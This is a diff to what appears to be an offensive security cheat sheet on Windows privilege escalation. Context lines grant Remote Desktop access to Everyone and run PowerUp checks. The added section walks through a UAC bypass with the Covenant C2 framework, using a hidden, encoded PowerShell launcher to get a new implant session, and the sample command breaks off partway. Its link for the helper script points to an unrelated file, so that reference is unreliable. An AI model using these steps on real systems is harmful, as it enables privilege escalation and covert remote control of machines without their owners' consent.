@@ -82,3 +82,16 @@ net localgroup "Remote Desktop Users" Everyone /Add
    . .\PowerUp.ps1
   Invoke-AllChecks
   ```
+# UAC Bypass (Covenant)
+- In covenant, Import PowerShell script named [Helper.ps1](https://github.com/microsoft/PowerShellForGitHub/blob/master/Helpers.ps1).
+- Run the cmd: ` PowerShell helper -custom "cmd.exe /c <powershell launcher command>"`
+- Few seconds after sending the command we get a new Grunts to our Covenant.
+
+```powershell
+(singhx) > PowerShellImport
+
+PowerShell Imported
+
+[07/24/2023 18:28:20 UTC] PowerShell completed
+
+(singhx) > powershell helper -custom "cmd.exe /c powershell -Sta -Nop -Window Hidden -EncodedCommand 
